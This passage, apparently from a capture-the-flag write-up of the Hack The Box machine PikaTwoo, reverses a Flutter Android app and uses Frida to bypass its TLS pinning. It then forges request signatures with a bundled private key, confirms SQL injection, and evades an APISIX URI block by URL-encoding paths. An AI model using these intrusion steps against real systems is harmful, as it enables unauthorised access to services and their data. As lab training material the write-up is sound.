oxdf@hacky$ curl http://10.10.11.199:8080/v1/AUTH_andrew/android
pokatmon-app.apk

```

I’ll download it with `wget`:

```

oxdf@hacky$ wget http://10.10.11.199:8080/v1/AUTH_andrew/android/pokatmon-app.apk
--2023-08-25 17:37:00--  http://10.10.11.199:8080/v1/AUTH_andrew/android/pokatmon-app.apk
Connecting to 10.10.11.199:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 12462792 (12M) [application/vnd.android.package-archive]
Saving to: ‘pokatmon-app.apk’

pokatmon-app.apk                                                    100%[===========================================>]  11.88M  1.07MB/s    in 17s

2023-08-25 17:37:21 (712 KB/s) - ‘pokatmon-app.apk’ saved [12462792/12462792]

```

## Recover Valid Email

### Static APK Analysis

#### Unpack Code

I’ll unpack the files in the APK using `apktool`. I could use `7z` or `unzip`, but `apktool` will also convert some binary files to more readable formats:

```

oxdf@hacky$ mkdir pokatmon-app
oxdf@hacky$ cp pokatmon-app.apk pokatmon-app
oxdf@hacky$ cd pokatmon-app
oxdf@hacky$ apktool d pokatmon-app.apk 
I: Using Apktool 2.5.0-dirty on pokatmon-app.apk
I: Loading resource table...
I: Decoding AndroidManifest.xml with resources...
I: Loading resource table from file: /home/oxdf/.local/share/apktool/framework/1.apk
I: Regular manifest package...
I: Decoding file-resources...
W: Can't find 9patch chunk in file: "drawable-mdpi-v4/notification_bg_low_pressed.9.png". Renaming it to *.png.
W: Can't find 9patch chunk in file: "drawable-xhdpi-v4/notification_bg_normal_pressed.9.png". Renaming it to *.png.
W: Can't find 9patch chunk in file: "drawable-hdpi-v4/notification_bg_normal_pressed.9.png". Renaming it to *.png.
W: Can't find 9patch chunk in file: "drawable-xhdpi-v4/notification_bg_normal.9.png". Renaming it to *.png.
W: Can't find 9patch chunk in file: "drawable-mdpi-v4/notification_bg_normal_pressed.9.png". Renaming it to *.png.
W: Can't find 9patch chunk in file: "drawable-xhdpi-v4/notification_bg_low_normal.9.png". Renaming it to *.png.
W: Can't find 9patch chunk in file: "drawable-mdpi-v4/notification_bg_low_normal.9.png". Renaming it to *.png.
W: Can't find 9patch chunk in file: "drawable-mdpi-v4/notification_bg_normal.9.png". Renaming it to *.png.
W: Can't find 9patch chunk in file: "drawable-hdpi-v4/notification_bg_low_pressed.9.png". Renaming it to *.png.
W: Can't find 9patch chunk in file: "drawable-hdpi-v4/notification_bg_low_normal.9.png". Renaming it to *.png.
W: Can't find 9patch chunk in file: "drawable-hdpi-v4/notification_bg_normal.9.png". Renaming it to *.png.
W: Can't find 9patch chunk in file: "drawable-xhdpi-v4/notification_bg_low_pressed.9.png". Renaming it to *.png.
I: Decoding values */* XMLs...
I: Baksmaling classes.dex...
I: Copying assets and libs...
I: Copying unknown files...
I: Copying original files...

```

#### Manifest

In the root of the unpacked application, `AndroidManifest.xml` describes how the app is configured and organized.

```

<?xml version="1.0" encoding="utf-8" standalone="no"?><manifest xmlns:android="http://schemas.android.com/apk/res/android" android:compileSdkVersion="31" android:compileSdkVersionCodename="12" package="htb.pokatmon.pokatmon_app" platformBuildVersionCode="31" platformBuildVersionName="12">
    <uses-permission android:name="android.permission.INTERNET"/>
    <application android:appComponentFactory="androidx.core.app.CoreComponentFactory" android:icon="@mipmap/ic_launcher" android:label="pokatmon_app" android:name="android.app.Application" android:usesCleartextTraffic="true">
        <activity android:configChanges="density|fontScale|keyboard|keyboardHidden|layoutDirection|locale|orientation|screenLayout|screenSize|smallestScreenSize|uiMode" android:exported="true" android:hardwareAccelerated="true" android:launchMode="singleTop" android:name="htb.pokatmon.pokatmon_app.MainActivity" android:theme="@style/LaunchTheme" android:windowSoftInputMode="adjustResize">
            <meta-data android:name="io.flutter.embedding.android.NormalTheme" android:resource="@style/NormalTheme"/>
            <intent-filter>
                <action android:name="android.intent.action.MAIN"/>
                <category android:name="android.intent.category.LAUNCHER"/>
            </intent-filter>
        </activity>
        <meta-data android:name="flutterEmbedding" android:value="2"/>
    </application>
</manifest>

```

A few things jump out:
- The package name is `htb.pokatmon.pokatmon_app`, which I’ll need later.
- The function that is called on start is `MainActivity` in that package.
- There are multiple references to Flutter.

The `assets/flutter_assets` directory also suggests this application is made with [Flutter](https://flutter.dev/), a framework for building mobile applications.

#### Find Code

[This post](https://cryptax.medium.com/reversing-an-android-sample-which-uses-flutter-23c3ff04b847) talks about reversing applications that are made with Flutter. I can check for a debug mode application at `assets/flutter_assets/kernel_blob.bin`, but there’s nothing there. For a release mode application, I’ll find `libflutter.so` in `lib/[arch]/`, and that’s the case here:

```

oxdf@hacky$ ls lib/x86_64/lib
libapp.so      libflutter.so  

```

`libapp.so` is the compiled application. In theory, I can import this into Ghidra and take a look, or work with some of the tools in that post, but I’m going to start with dynamic analysis instead.

#### Other Files

Before I move on, I will take a look at the files in the application. I can try taking a look at the `smali` directory, as that’s typically the most human-readable code. Unfortunately, it’s just an incredibly obfuscated mess. This is the result of the app’s being built with the `--obfuscate` flutter option.

The `flutter_assets` directory does has a `keys` directory:

```

oxdf@hacky$ ls assets/flutter_assets/
AssetManifest.json  FontManifest.json  fonts  images  keys  NOTICES.Z  packages

```

Inside it there is a public and private RSA key pair:

```

oxdf@hacky$ ls assets/flutter_assets/keys/
private.pem  public.pem

```

I’ll use these later.

### Configure Emulator

There are several Android emulators out there. My preferred one is Genymotion, as it’s just the easiest to get a VM created and running (shown previously in [RouterSpace](/2022/07/09/htb-routerspace.html#setup-genymotion) and [2019 Flare-On Flarebear](/flare-on-2019/flarebear.html)). Ippsec has a [really nice video](https://www.youtube.com/watch?v=xp8ufidc514) showing how to get the Genymotion Android emulator running (inside a VM). I’ll follow similar steps here to get a VM running, install the Pokatmon application, and have network traffic proxied through Burp to look at the traffic coming out of the application.

#### Installing Emulator

Because I’m going to run VirtualBox (Genymotion) inside of VirtualBox (my VM), I’ll need to make sure my VM has nested virtualization enabled (and that it’s enabled in my BIOS):

![image-20230828064806827](/img/image-20230828064806827.png)

I’ll also make sure it has as many processors and RAM as I can give it, as the Android VM will want 4GB of RAM and 4 processors as a minimum.

I’ll start by getting the prereq packages installed for Genymotion with `sudo apt install virtualbox adb`. Next, I’ll get the latest installed from the [Genymotion download page](https://www.genymotion.com/download/), set it as executable, and run it:

```

oxdf@hacky$ chmod +x ~/Downloads/genymotion-3.5.0-linux_x64.bin
oxdf@hacky$ ~/Downloads/genymotion-3.5.0-linux_x64.bin
Installing for current user only. To install for all users, restart this installer as root.

Installing to folder [/home/oxdf/genymotion]. Are you sure [y/n] ? y
- Extracting files ..................................... OK (Extract into: [/home/oxdf/genymotion])
- Installing launcher icon ............................. OK

Installation done successfully.

You can now use these tools from [/home/oxdf/genymotion]:
 - genymotion
 - genymotion-shell
 - gmtool
oxdf@hacky$ cd genymotion
oxdf@hacky$ ./genymotion
Logging activities to file: /home/oxdf/.Genymobile/genymotion.log

```

This launches a brief setup. I’ll have to register an account or login with my account, and select the free for personal use option. Eventually it launches the emulator:

![image-20230828064134099](/img/image-20230828064134099.png)

#### Create a VM

The plus button at the top right will start the process of adding a new virtual device. In the first window, I’ll filter on Pixel to get a clean Android experience, and select the newest one, the Pixel 3XL:

![image-20230828064301946](/img/image-20230828064301946.png)

On the next page, I’ll leave everything as is:

![image-20230828064421699](/img/image-20230828064421699.png)

Android 12 is almost two years old (released in October 2021), but it is still widely in use in 2023, so it should be good enough for what I need here.

The next page sets the hardware, which I’ll leave as the default:

![image-20230828064928929](/img/image-20230828064928929.png)

I’ll let the next three pages be default as well, and when I finish, it starts creating the device:

![image-20230828065014217](/img/image-20230828065014217.png)

Once that’s done, it pops up to let me know:

![image-20230828065036797](/img/image-20230828065036797.png)

I’ll click start, and it moves to “Booting”. This can take a while - I think it’s just that doing VirtualBox inside VirtualBox like this is slow. Once it’s done, I’ll have a virtual Android device:

![image-20230828065724100](/img/image-20230828065724100.png)

#### Install Pokatmon

`adb` is the Android debugger, a command line tool to interface with attached Android devices. Genymotion launches in such a way that the device is visible to `adb`, attached as if plugged in as a USB device:

```

oxdf@hacky$ adb devices
List of devices attached
192.168.56.102:5555     device

```

To install the application on the virtual phone, I’ll use `adb install`:

```

oxdf@hacky$ adb install pokatmon-app.apk
Performing Streamed Install
Success

```

Now pulling up from the bottom on the phone, the application is there:

![image-20230828070330024](/img/image-20230828070330024.png)

Clicking on it will launch it:

![image-20230828070358199](/img/image-20230828070358199.png)

The “Invite Code” field seems to only take digits and upper-case characters. Putting some junk in and clicking “Join Beta” returns:

![image-20230828070515942](/img/image-20230828070515942.png)

Genymotion is smart enough to use my `/etc/hosts` file. If I comment out the domains I set earlier and click again, it shows:

![image-20230828070636802](/img/image-20230828070636802.png)

If I watch in Wireshark for this connection (with the IP set in `hosts`), I’ll see it’s happening over 443 / TLS, so I can’t snoop this way.

#### Remount Read/Write

If I try to write to most of the filesystem right now, it will fail, as `/` is mounted read only. For example:

```

oxdf@hacky$ adb push test.txt /
adb: error: failed to copy 'test.txt' to '/test.txt': remote couldn't create file: Read-only file system
test.txt: 0 files pushed. 0.0 MB/s (21 bytes in 0.003s)

```

I’ll get a shell on the device and run `mount` to see that `/` is mounted “ro” for read only:

```

oxdf@hacky$ adb shell
vbox86p:/ # mount
tmpfs on /dev type tmpfs (rw,seclabel,nosuid,relatime,mode=755)
devpts on /dev/pts type devpts (rw,seclabel,relatime,mode=600,ptmxmode=000)
proc on /proc type proc (rw,relatime,gid=3009,hidepid=invisible)
sysfs on /sys type sysfs (rw,seclabel,relatime)
selinuxfs on /sys/fs/selinux type selinuxfs (rw,relatime)
tmpfs on /mnt type tmpfs (rw,seclabel,nosuid,nodev,noexec,relatime,mode=755,gid=1000)
/dev/block/sda4 on / type ext4 (ro,seclabel,nodev,noatime)
...[snip]...

```

I can fix this by remounting the disk. I’ll first run `su` to get full root, and then `mount` with the `remount` option:

```

vbox86p:/ # su
:/ # mount -o remount,rw /

```

Now if I `push` a file, it works:

```

oxdf@hacky$ adb push test.txt /
test.txt: 1 file pushed. 0.0 MB/s (21 bytes in 0.036s)

```

#### Add Burp Certificate

Now I want to get the phone to trust the certificates generated by Burp so that connections to my proxy will be trusted. This step isn’t actually required for how I ended up solving this part of PikaTwoo, but I wanted to show the steps I took to help explain my thinking.

With Burp proxy enabled, I’ll fetch the certificate from `localhost:8080/cert` and convert it to the pem format:

```

oxdf@hacky$ curl localhost:8080/cert -o burp.der
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   940  100   940    0     0  79097      0 --:--:-- --:--:-- --:--:-- 85454
oxdf@hacky$ openssl x509 -inform der -in burp.der -out burp.pem

```

I need to rename it to a specific value based on a hash of the certificate. For this certificate, it will always be `9a5ba575.0`, where `9a5ba575` can be determined here:

```

oxdf@hacky$ openssl x509 -inform pem -subject_hash_old -in burp.pem
9a5ba575
-----BEGIN CERTIFICATE-----
MIIDqDCCApCgAwIBAgIFAMZY3r0wDQYJKoZIhvcNAQELBQAwgYoxFDASBgNVBAYT
C1BvcnRTd2lnZ2VyMRQwEgYDVQQIEwtQb3J0U3dpZ2dlcjEUMBIGA1UEBxMLUG9y
dFN3aWdnZXIxFDASBgNVBAoTC1BvcnRTd2lnZ2VyMRcwFQYDVQQLEw5Qb3J0U3dp
Z2dlciBDQTEXMBUGA1UEAxMOUG9ydFN3aWdnZXIgQ0EwHhcNMTQwMjIwMTY0OTEy
WhcNMzMwMjIwMTY0OTEyWjCBijEUMBIGA1UEBhMLUG9ydFN3aWdnZXIxFDASBgNV
BAgTC1BvcnRTd2lnZ2VyMRQwEgYDVQQHEwtQb3J0U3dpZ2dlcjEUMBIGA1UEChML
UG9ydFN3aWdnZXIxFzAVBgNVBAsTDlBvcnRTd2lnZ2VyIENBMRcwFQYDVQQDEw5Q
b3J0U3dpZ2dlciBDQTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAKRW
lMjbEyu5K8bxI/RCiMhB356Z/+idwkYEt6uS7AvZ+3ngLK+AjS4sxQQHUruUP+Qf
QZ6TaCPuKgwfLjTg1xsSo9lM00oVcmxFRsT6Q5egHbsae3QCNSR02snm2ciGhCOl
t9Ers8mq0yegdzuUwayUwXghrYdOSKOuO3+w3YH7VLdamkVrVNr0Ip0e9yjzS9b9
F7pLfERd3eISRjze4QHpd7N+vzNilqQSzoKWTMIfL8M09zfrqinbzeExKYBWPxTW
d/oEUHTLnJaLhcyM/wZJo66powKUhTLWYPOdEKgiO43+AlkpHDN0FCFdhwNNIXSr
SNLEykz/XOusPQUKRisCAwEAAaMTMBEwDwYDVR0TAQH/BAUwAwEB/zANBgkqhkiG
9w0BAQsFAAOCAQEAPfM2VJvS7cdaEiJpV+5UZlXonx2Y4JIynd8waUeKQqIiq3IR
LbjpXHURb3URuo7zTlHU3Hpgtwexm9P1wfoO8s0M9YnffKO+/PPp5WOE/hA5nAhM
yuMqjakYUV1VwgCW7bZ7h9Cgeq45rvWg8IiPx/0Ihsy7lu5CPTuByAcNrs6gJd1h
/tbDVj2SDLyP86lKSFclIRTIffA7e2HWrSlNgcdVCz0vLwoyCCheCa0DpPBGfCQp
9+9uDR9zQvc29J5NluBjnY1t55BXlAcVhYoY/+aJsajFlb0wb/TQaGLLeOi4Gfbp
UyURMzRZxjckyV/FeIQtoD19PepLcXVObaVBwA==
-----END CERTIFICATE-----
oxdf@hacky$ cp burp.pem 9a5ba575.0

```

I’ll enable that on the Android device with `adb`:

```

oxdf@hacky$ adb push 9a5ba575.0 /system/etc/security/cacerts/
9a5ba575.0: 1 file pushed. 0.1 MB/s (1330 bytes in 0.015s)

```

I’ll set my host as the proxy for the device with `adb` as well (where 10.0.2.5 is the IP of my host):

```

oxdf@hacky$ adb shell settings put global http_proxy 10.0.2.5:8080

```

I’ll make sure that Burp is listening on all interfaces under Proxy > Proxy Settings > Proxy Listeners: 

![image-20230828125508701](/img/image-20230828125508701.png)

Now opening the WebViewer test browser and visiting a page, the request shows up in Burp:

![image-20230828134838028](/img/image-20230828134838028.png)

Unfortunately, traffic from the application still doesn’t show up in Burp.

#### Install Frida

My best guess as to why this is failing is due to certificate pinning, which is where the application doesn’t just accept any certificate that is valid according to the OS cert store, but rather limits to known good certs to prevent just this kind of attacker in the middle attack.

Frida is a toolset for “dynamic instrumentation” of mobile applications. It is kind of like [Tampermonkey](https://www.tampermonkey.net/) for mobile applications. [This page](https://frida.re/docs/android/) has instructions for getting it installed for Android.

I’ll run `pipx install frida-tools` to get that part installed on my VM.

I also need the Frida server on the emulated Pixel. I’ll need to know the architecture of the Pixel, which I can check with `adb shell` to see it’s x86\_64:

```

oxdf@hacky$ adb shell getprop ro.product.cpu.abi
x86_64

```

I’ll go to the latest [release page](https://github.com/frida/frida/releases), and among the many files, find the `frida-server-[version]-android-x86_64.xz` file. I’ll unzip the resulting file with `7z x frida-server-16.1.3-android-x86_64.xz`, which gives a single executable file.

Following the instructions, I’ll upload it and set it executable:

```

oxdf@hacky$ adb push frida-server-16.1.3-android-x86_64 /data/local/tmp/frida-server
frida-server-16.1.3-android-x86_64: 1 file pushed. 53.7 MB/s (108121848 bytes in 1.921s)
oxdf@hacky$ adb shell "chmod 755 /data/local/tmp/frida-server"

```

While the instructions don’t show this, I found in experimenting that I’ll need to run Frida as full root, so I’ll get a shell, `su`, and run it:

```

oxdf@hacky$ adb shell
vbox86p:/ # su
:/ # chmod 755 /data/local/tmp/frida-server
:/ # /data/local/tmp/frida-server 

```

The last command just hangs, but in another windows I can do `frida-ls -U` to get a file listing of the mobile device (`/test.txt` is there from earlier):

```

oxdf@hacky$ frida-ls -U 
drwxr-xr-x  23 root   root       4096 Mon Aug 28 19:27:38 2023 .
drwxr-xr-x  23 root   root       4096 Mon Aug 28 19:27:38 2023 ..
drwxr-xr-x   2 root   root       4096 Mon Jan 23 10:24:12 2023 acct
drwxr-xr-x  23 root   root        480 Mon Aug 28 10:50:46 2023 apex
lrw-r--r--   1 root   root         11 Mon Jan 23 11:26:15 2023 bin -> /system/bin
lrw-r--r--   1 root   root         50 Mon Jan 23 11:26:15 2023 bugreports -> /data/user_de/0/com.android.shell/files/bugreports
drwxrwx---   6 system cache      4096 Mon Aug 28 10:50:51 2023 cache
drwxr-xr-x   3 root   root          0 Mon Aug 28 10:50:44 2023 config
lrw-r--r--   1 root   root         17 Mon Jan 23 11:26:15 2023 d -> /sys/kernel/debug
drwxrwx--x  49 system system     4096 Mon Aug 28 10:55:41 2023 data
drwx------   6 root   system      120 Mon Aug 28 10:50:53 2023 data_mirror
drwxr-xr-x   2 root   root       4096 Mon Jan 23 10:24:12 2023 debug_ramdisk
drwxr-xr-x  24 root   root       3020 Mon Aug 28 10:52:21 2023 dev
lrw-r--r--   1 root   root         11 Mon Jan 23 11:26:15 2023 etc -> /system/etc
lrwxr-x---   1 root   shell        16 Mon Jan 23 11:26:15 2023 init -> /system/bin/init
-rwxr-x---   1 root   shell       463 Mon Jan 23 10:24:12 2023 init.environ.rc
drwxr-xr-x  10 root   root        240 Mon Aug 28 10:50:46 2023 linkerconfig
drwx------   2 root   root      16384 Mon Jan 23 11:26:18 2023 lost+found
drwxr-xr-x  16 root   system      340 Mon Aug 28 10:50:48 2023 mnt
drwxr-xr-x   2 root   root       4096 Mon Jan 23 10:24:12 2023 odm
drwxr-xr-x   2 root   root       4096 Mon Jan 23 10:24:12 2023 odm_dlkm
drwxr-xr-x   2 root   root       4096 Mon Jan 23 10:24:12 2023 oem
drwxr-xr-x   2 root   root       4096 Mon Jan 23 10:24:12 2023 postinstall
dr-xr-xr-x 254 root   root          0 Mon Aug 28 10:50:45 2023 proc
lrw-r--r--   1 root   root         15 Mon Jan 23 11:26:15 2023 product -> /system/product
lrw-r--r--   1 root   root         11 Mon Jan 23 11:26:15 2023 sbin -> /system/bin
lrw-r--r--   1 root   root         21 Mon Jan 23 11:26:15 2023 sdcard -> /storage/self/primary
drwxr-xr-x   2 root   root       4096 Mon Jan 23 10:24:12 2023 second_stage_resources
drwx--x---   4 shell  everybody    80 Mon Aug 28 10:50:48 2023 storage
dr-xr-xr-x  13 root   root          0 Mon Aug 28 10:50:45 2023 sys
drwxr-xr-x  17 root   root       4096 Mon Jan 23 11:04:02 2023 system
lrw-r--r--   1 root   root         18 Mon Jan 23 11:26:15 2023 system_ext -> /system/system_ext
-rw-r--r--   1 root   root         21 Fri Aug 25 20:57:38 2023 test.txt
lrw-r--r--   1 root   root         15 Mon Jan 23 11:26:15 2023 tmp -> /data/local/tmp
lrw-r--r--   1 root   root         14 Mon Jan 23 11:26:15 2023 vendor -> /system/vendor
drwxr-xr-x   2 root   root       4096 Mon Jan 23 10:24:12 2023 vendor_dlkm

```

### Dynamic Analysis

#### Strategy

My goal here is to get the application to make its “Join Beta” request in a manner I can see it. To get the traffic going to, I’m going to update my `hosts` file so that it thinks my IP is `api.pokatmon-app.htb`. Then I’ll have Burp listen on 443 forwarding requests to the real PikaTwoo server.

For this to work, I’ll need to get around the TLS certificate pinning. I’ll use Frida to inject a script into the application that patches out that check.

#### Setup

I’ll update my `hosts` file so that `api.pkatmon-app.htb` points at my IP, 10.0.2.5.

I’ll need Burp listening on 443. I’ll have to run it as root to get this, and then I’ll add a new listener:

![image-20230829145233322](/img/image-20230829145233322.png)

The request will be coming directly to this listening, rather than as a proxy, so I’ll need to tell it where to go. Under “Request handling”, I’ll configure it to go to PikaTwoo:

![image-20230829145354731](/img/image-20230829145354731.png)

“Support invisible proxing” is important here, as that’s what tells Burp to decode the TLS connection and start a new one to PikaTwoo.

Finally, I need to inject [this script](https://github.com/NVISOsecurity/disable-flutter-tls-verification/tree/main) from NVISO. It disables the TLS verification for a Flutter application. Looking at the JavaScript, it has some regex that match on different bytecodes for different OS / architectures:

[![image-20230829145708002](/img/image-20230829145708002.png)*Click for full size image*](/img/image-20230829145708002.png)

It looks through memory for these patterns, and then replaces the assembly in such a way to effectively disable the TLS check.

I’ll use the application name I found above, and inject this with `frida` using `-U` for USB device, `-f [app name]` and `-l [script]`:

```

oxdf@hacky$ frida -U -f htb.pokatmon.pokatmon_app -l disable-flutter-tls.js 
     ____
    / _  |   Frida 16.1.3 - A world-class dynamic instrumentation toolkit
   | (_| |
    > _  |   Commands:
   /_/ |_|       help      -> Displays the help system
   . . . .       object?   -> Display information about 'object'
   . . . .       exit/quit -> Exit
   . . . .
   . . . .   More info at https://frida.re/docs/home/
   . . . .
   . . . .   Connected to Pixel 3 XL (id=192.168.56.106:5555)
Spawning `htb.pokatmon.pokatmon_app`...                                 
[+] Java environment detected
Spawned `htb.pokatmon.pokatmon_app`. Resuming main thread!              
[Pixel 3 XL::htb.pokatmon.pokatmon_app ]-> [+] libflutter.so loaded
[+] Flutter library found
[!] ssl_verify_peer_cert not found. Trying again...
[+] ssl_verify_peer_cert found at offset: 0x3c43fe

```

Running this kills the app if it’s already running and relaunches it. It reports that it found the target function (`ssl_verify_peer_cert`) in memory in `libflutter.so` and patched it.

#### Make Request

I’ll enter anything into the fields on the application, and click “Join Beta”. It reports “Invalid code”, which is a good sign it was able to talk to the server:

![image-20230829150112611](/img/image-20230829150112611.png)

In Burp there’s a HTTP stream with the POST request and the response:

[![image-20230829150228156](/img/image-20230829150228156.png)*Click for full size image*](/img/image-20230829150228156.png)

#### Identify Signing

I’ll send this request over to Repeater to take a look. I’m able to send it again and get the same response:

![image-20230829151207091](/img/image-20230829151207091.png)

If I change the code at all, the response changes to “invalid signature”:

![image-20230829151241051](/img/image-20230829151241051.png)

There is an `authorization` header that has a signature in it. If I go back to the app and submit with a “2” on the end of the code (to match what I added in Repeater above), the request has a different `signature` header and it returns “invalid code”. This suggests that the application is signing each request and that the server is validating that.

#### Signing Messages

I noted above a `private.pem` RSA key file. That seems like a good candidate for what is signing the requests. I’ll ask ChatGPT how to sign a message with an RSA key and `bash`, and it suggests `openssl`:

![image-20230829151840718](/img/image-20230829151840718.png)

It’s suggesting signing a hash of the message. I’ll play around with different things, looking at the message, the hash of the message, with and without newlines on the message, etc. I’ll note that the hash is binary, and the header is base64, so I’ll encode the result as well. After some playing, I get this:

```

oxdf@hacky$ openssl dgst -sha256 -sign pokatmon-app/assets/flutter_assets/keys/private.pem <( echo -n "app_beta_mailaddr=0xdf&app_beta_code=111111") | base64
GDhVgeKSuzLDEK7+TZIm9xS3EKa6AKSEb/ioTaphZ5XAIoMpAGkDmSZD1ALjc+fX9F4VyGE1EXk7
H0Hk41w7XLTApqktJrb0lirhhLNkNM2x/JU8q6iaD9xxIOE3Vp7o01JrboWUw6I0oNSFwPZiCcOg
IzuQgbpa/G1RvWJGVvL47vHAQbs2lNFjblUuULxXgjzpM+OAYElaagvBH1XnVmrZAahj2QgX3ii6
CmlMxRrNfzgsePgV6V5RT61+uc2yIwcXHyNFHBj74x2/n4GOR1TpMhM3LCtUHTN7YUPchyzj48K2
oh24Jx+qCwsBopaLHwppwGLCNNQHMls16s53Aw==

```

This matches the signature header above! Now I can sign my own messages.

### SQL Injection

#### Strategy

With the ability to sign my own requests, I can try different things, just updating the signature header each time. To start, I’ll just up arrow and edit the POST body to get the new signature. If that gets to be tiring, I could write a Python script that takes a body, generates the signature, sends the request, and returns the result.

#### SQL POC

I’ll try changing the “email” field to just a single quote. If this causes a crash, I can try more SQL injection payloads. I’ll generate a signautre:

```

oxdf@hacky$ openssl dgst -sha256 -sign pokatmon-app/assets/flutter_assets/keys/private.pem <( echo -n "app_beta_mailaddr='&app_beta_code=111111") | base64 -w 0; echo
ZVFVUMMNUgf8f1Pps/W8X+URSj+IJbf9+OOZYZGKSdaPmsHpxfl9VdAAJohpWsk1cHCP5m1Zr6/T09OCcEdvIGQvSYx6DN5XZcAyt6v984+LH6l5azsuE74V0uULsdebaXmuoDkCasd8Np6B1ebYFtBOzHNV+/ERyVJGatCwx6zKH1TDvQVvlhO48cNcbtkii5kTsY1tds4zKDnSwiHxWTfIS/MAOyO4dVL38uvyUf7iFJU+YrbySUgeNZlWKQlPYEoX86GdsS4dSLRZiXTXlsese8QxtCOKmQvATURXVkp0diKHaRIk1KLi4G81X9KNkivdrnh9EsNXs+S7Fa5TxQ==

```

On updating the signature (making sure to leave `signature=` at the front) and body and sending, it returns 500 Server Error, which is definitely promising:

![image-20230829154333425](/img/image-20230829154333425.png)

That *could* be SQL injection. I’ll see if I get back a “valid” message with an injection:

![image-20230829154449197](/img/image-20230829154449197.png)

Not only is this valid, but it returns the email and the code! I was expecting to have to brute force these with SQL regex.

I could go on trying to extract more information from the DB, but this is all I need to continue with the box, and it’s a minor pain to do with the signing (though I think it could make a nice tamper script in `sqlmap`).

#### Join Beta

With a valid email and code, I can join the beta. It fails trying to load `www.pokatmon-app.htb` (over HTTP, not HTTPS):

![image-20230829150918872](/img/image-20230829150918872.png)

I’ll update my `hosts` file to include the `www` subdomain, and it just loads the page I have already accessed on TCP 80:

![image-20230829151532541](/img/image-20230829151532541.png)

## Access to Docs

### APISIX Vulns

Searching for APISIX vulnerabilities finds a few that this version should be vulnerable to:
- [CVE-2022-24112](https://apisix.apache.org/blog/2022/02/11/cve-2022-24112/) - An issue in the `X-REAL-IP` header that allows for bypassing IP restrictions, *and*, if the default Admin Key is present, the batch-requests plugin will allow for remote code execution. [This POC](https://github.com/twseptian/cve-2022-24112/tree/main) will exploit the vuln, but it doesn’t work here (likely because the default admin key was changed).
- [CVE-2022-29266](https://lists.apache.org/thread/6qpfyxogbvn18g9xr8g218jjfjbfsbhr) - The `jwt-auth` plugin will leak the preconfigured secret. I haven’t seen any JWT in use here yet, so may not apply.
- [CVE-2022-25757](https://lists.apache.org/thread/03vd2j81krxmpz6xo8p1dl642flpo6fv) - If there are duplicate keys in JSON POST requests, it will accept the last version, allowing bad data to pass through scheme validation. I don’t really have an example where this might work to get me something at this point.
- [CVE-2021-43557](https://www.cvedetails.com/cve/CVE-2021-43557/) - Before 2.10.2, the `uri-block` plugin uses the raw URL without normalization, mean that if `^/internal` is blocked, `//internal/` would bypass the block. This is particularly interesting as it is patch in the next version after 2.10.1 on PikaTwoo and because I’ve already identified that `uri-block` is running here.

### Identify password-reset Endpoint

#### Manual CVE-2021-43557 Attempts

Given that I already identified `uri-block` blocking anything with “private” [above](#directory-brute-force-1), it makes sense to try to abuse CVE-2021-43557 to get past that. Adding an extra `/` doesn’t work as the example above:

```

oxdf@hacky$ curl -k https://10.10.11.199/private
{"error_msg":"access is not allowed"}
oxdf@hacky$ curl -k https://10.10.11.199//private
{"error_msg":"access is not allowed"}

```

In fact, anything with “private” anywhere seems to still get blocked:

```

oxdf@hacky$ curl -k https://10.10.11.199/0xdf/private
{"error_msg":"access is not allowed"}

```

However, if I URL encode a character, such as “p” -> “%70”, it returns a 404:

```

oxdf@hacky$ curl -k https://10.10.11.199/%70rivate
{"error_msg":"404 Route Not Found"}

```

This could be just failing to find that route (because I’m looking for something else besides `/private`), or it could be that I need to find an endpoint in that directory.

#### feroxbuster

To explore if there is a `private` directory, I’m going to create a custom wordlist where I replace all the instances of “private” with “%70rivate”:

```

oxdf@hacky$ cp /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt raft-medium-directories-modified.txt
oxdf@hacky$ sed -i 's/private/%70rivate/g' raft-medium-directories-modified.txt 

```

Now when it tries `/private`, it will encode it and if it is bypassing the filter, then it will work.

I’ll try `feroxbuster` with that list in the `/%70rivate` directory:

```

oxdf@hacky$ feroxbuster -k -u https://10.10.11.199/%70rivate -w raft-medium-directories-modified.txt 

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.9.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ https://10.10.11.199/%70rivate
 🚀  Threads               │ 50
 📖  Wordlist              │ raft-medium-directories-modified.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.9.3
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🏁  HTTP methods          │ [GET]
 🔓  Insecure              │ true
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        1l        4w       36c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
405      GET        4l       23w      178c https://10.10.11.199/%70rivate/login
200      GET        1l        2w       43c https://10.10.11.199/%70rivate/password-reset
[####################] - 1m     30000/30000   0s      found:2       errors:0
[####################] - 1m     30000/30000   401/s   https://10.10.11.199/%70rivate/ 

```

`feroxbuster` finds two interesting results:
- `/private/login` returns 405 method not allowed. I should look at a POST request for that endpoint.
- `/private/password-reset` returns 200!

### Reset roger.foster’s Password

#### login

The `/private/login` endpoint with a POST request returns details about what is missing and I can build a valid request:

```

oxdf@hacky$ curl -k https://10.10.11.199/%70rivate/login
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>405 Method Not Allowed</title>
<h1>Method Not Allowed</h1>
<p>The method is not allowed for the requested URL.</p>
oxdf@hacky$ curl -k -X POST https://10.10.11.199/%70rivate/login
{"error":"missing parameter email"}
oxdf@hacky$ curl -k -X POST https://10.10.11.199/%70rivate/login -d 'email=0xdf@pokatmon-app.htb'
{"error":"missing parameter password"}
oxdf@hacky$ curl -k -X POST https://10.10.11.199/%70rivate/login -d 'email=0xdf@pokatmon-app.htb&password=0xdf0xdf'
{"error":"invalid credentials"}

```

I’ll try with the roger.foster email, and it returns the same thing:

```

oxdf@hacky$ curl -k -X POST https://10.10.11.199/%70rivate/login -d 'email=roger.foster37@freemail.htb&password=0xdf0xdf'

```

#### password-reset

